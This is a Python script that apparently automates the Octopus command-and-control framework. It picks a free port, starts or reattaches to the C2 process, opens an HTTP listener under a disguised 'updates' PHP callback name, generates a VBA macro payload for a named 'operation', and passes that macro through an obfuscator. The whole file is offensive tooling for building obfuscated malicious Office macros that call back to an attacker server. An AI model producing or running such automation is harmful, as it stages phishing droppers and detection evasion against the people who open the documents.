import subprocess,os,time,random
# This is an automation script for Octubos Build by Reuvein Vinokurov & Chananel Gerstensang
os.system("export PATH=/home/ubuntu/vba_obfus/vba_obfuscator/:$PATH")
operation_name = input("Please Provide Operation Name: ")
#operation_name = "Test2"
macro_name = input("Please Provide name for the Macro File: ")
#macro_name = "macro3.macro"
#port_number = input("Please provide Port number: ")

check_ports = subprocess.Popen(["netstat", "-na"], stdout=subprocess.PIPE , stdin=subprocess.PIPE)
port_number = 8080
while len(subprocess.Popen(['grep %s'%port_number], stdin=check_ports.stdout, stdout=subprocess.PIPE,shell=True).communicate()[0]) > 0:
    port_number = port_number+1
    check_ports.stdout.close()
    check_ports = subprocess.Popen(["netstat", "-na"], stdout=subprocess.PIPE , stdin=subprocess.PIPE)
check_ports.stdout.close()

print("Port %s it is."%port_number)
#port = os.system("netstat -anolp | grep "+port_number)
# Writing all the logs from the process into "file.txt"
log = open('file.txt', 'a')



#subprocess.Popen(["ps aux", 'grep "python3 octopus.py ','wc -l'])
p1 = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
p2 = subprocess.Popen(['grep "python3 octopus.py fakeit"'], stdin=p1.stdout, stdout=subprocess.PIPE,shell=True)
p1.stdout.close()
p3 = subprocess.Popen(['wc', '-l'], stdin=p2.stdout, stdout=subprocess.PIPE)
p2.stdout.close()
process_count = p3.communicate()[0].strip()
if len(process_count) == 0:
    process_count=1
process_count = int(process_count)-1
print("Number of processes: %s"%(process_count))

if process_count < 1:
    p = subprocess.Popen(["nohup","python3","octopus.py","fakeit"], stdout=subprocess.PIPE , stdin=subprocess.PIPE)
else:
    p1 = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(['grep "python3 octopus.py fakeit"'], stdin=p1.stdout, stdout=subprocess.PIPE,shell=True)
    p1.stdout.close()
    p3 = subprocess.Popen(['grep', '-v', 'grep'], stdin=p2.stdout, stdout=subprocess.PIPE)
    p2.stdout.close()
    p4 = subprocess.Popen(['tr -s " "'], stdin=p3.stdout, stdout=subprocess.PIPE, shell=True)
    p3.stdout.close()
    p5 = subprocess.Popen(['cut -d " " -f2'], stdin=p4.stdout, stdout=subprocess.PIPE, shell=True)
    p4.stdout.close()
    process_id = int(p5.communicate()[0].strip())
    print("Octopus process id: %s"%process_id)
    print("reptyr -s %s"%process_id)
    p = subprocess.Popen(["reptyr", "-s", "%s"%process_id], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

a = ("listen_http 0.0.0.0 "+str(port_number)+" #YOUR MEACHINE IP# 5 updates-" + str(random.randint(0,1000000)) + ".php "+operation_name+"\n").encode()
b = ("generate_macro "+operation_name+" "+macro_name+"\n").encode()
p.stdin.write(a)
p.stdin.flush()
p.stdin.write(b)
p.stdin.flush()


time.sleep(3)

cur_dir = os.path.abspath(".")
os.system("mv %s/%s %s/macro/%s.macro"%(cur_dir, macro_name, cur_dir, macro_name))
os.system("python3 /home/ubuntu/vba_obfus/vba-obfuscator/obfuscate.py %s/macro/%s.macro --output %s/macro/%s.obfuscated"%(cur_dir,macro_name,cur_dir,macro_name))
log.close()
